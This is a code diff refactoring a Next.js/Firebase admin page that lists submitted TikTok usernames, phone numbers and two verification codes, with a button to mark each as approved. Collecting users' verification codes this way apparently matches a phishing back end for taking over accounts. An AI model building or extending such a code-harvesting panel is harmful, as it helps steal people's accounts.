@@ -14,7 +14,7 @@ import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/com
 import { Badge } from "@/components/ui/badge"
 import { useCollection, useFirestore, useMemoFirebase } from "@/firebase";
 import { collection, query, doc } from "firebase/firestore";
-import { Loader2, CheckCircle } from "lucide-react";
+import { Loader2, CheckCircle, UserX } from "lucide-react";
 import { useAuth } from "@/firebase";
 import { Button } from "@/components/ui/button";
 import { useRouter } from "next/navigation";
@@ -30,12 +30,17 @@ export default function AdminPage() {
       if (!firestore) return null;
       return query(collection(firestore, 'tiktok_users'));
     }, [firestore]);
+
   const { data: users, isLoading: usersLoading } = useCollection(usersQuery);
 
   const handleLogout = async () => {
     if (!auth) return;
-    await auth.signOut();
-    router.push('/login');
+    try {
+        await auth.signOut();
+        router.push('/login');
+    } catch (e) {
+        console.error("Logout failed", e);
+    }
   };
 
   const handleApprove = (userId: string) => {
@@ -44,25 +49,28 @@ export default function AdminPage() {
     updateDocumentNonBlocking(userDocRef, { isVerified: true });
   }
 
-  return (
-    <div className="container py-8">
-      <Card>
-        <CardHeader className="flex flex-row items-center justify-between">
-          <div>
-            <CardTitle>Admin Control Panel</CardTitle>
-            <CardDescription>
-              List of TikTok usernames pending approval.
-            </CardDescription>
-          </div>
-          <Button onClick={handleLogout} variant="outline">Logout</Button>
-        </CardHeader>
-        <CardContent>
-          {usersLoading ? (
-             <div className="flex justify-center items-center h-64">
-                <Loader2 className="h-8 w-8 animate-spin text-primary" />
+  const renderContent = () => {
+    if (usersLoading) {
+        return (
+             <div className="flex flex-col items-center justify-center h-64 text-center">
+                <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
+                <p className="text-muted-foreground">Loading submissions...</p>
              </div>
-          ) : (
-          <Table>
+        );
+    }
+
+    if (!users || users.length === 0) {
+        return (
+             <div className="flex flex-col items-center justify-center h-64 text-center">
+                <UserX className="h-12 w-12 text-muted-foreground mb-4" />
+                <p className="font-semibold">No submissions yet</p>
+                <p className="text-muted-foreground text-sm">When a user fills out the form, their submission will appear here.</p>
+             </div>
+        );
+    }
+
+    return (
+        <Table>
             <TableCaption>A list of accounts pending manual approval.</TableCaption>
             <TableHeader>
               <TableRow>
@@ -79,8 +87,8 @@ export default function AdminPage() {
                 <TableRow key={user.id}>
                   <TableCell className="font-medium">@{user.tiktokUsername}</TableCell>
                   <TableCell>{user.phoneNumber || 'Not Selected'}</TableCell>
-                  <TableCell>{user.verificationCode}</TableCell>
-                   <TableCell>{user.finalCode}</TableCell>
+                  <TableCell>{user.verificationCode || 'N/A'}</TableCell>
+                   <TableCell>{user.finalCode || 'N/A'}</TableCell>
                   <TableCell>
                     <Badge variant={user.isVerified ? 'default' : 'secondary'}>
                       {user.isVerified ? 'Approved' : 'Pending'}
@@ -101,8 +109,24 @@ export default function AdminPage() {
                 </TableRow>
               ))}
             </TableBody>
-          </Table>
-          )}
+        </Table>
+    );
+  }
+
+  return (
+    <div className="container py-8">
+      <Card>
+        <CardHeader className="flex flex-row items-center justify-between">
+          <div>
+            <CardTitle>Admin Control Panel</CardTitle>
+            <CardDescription>
+              List of TikTok usernames pending approval.
+            </CardDescription>
+          </div>
+          <Button onClick={handleLogout} variant="outline">Logout</Button>
+        </CardHeader>
+        <CardContent>
+            {renderContent()}
         </CardContent>
       </Card>
     </div>
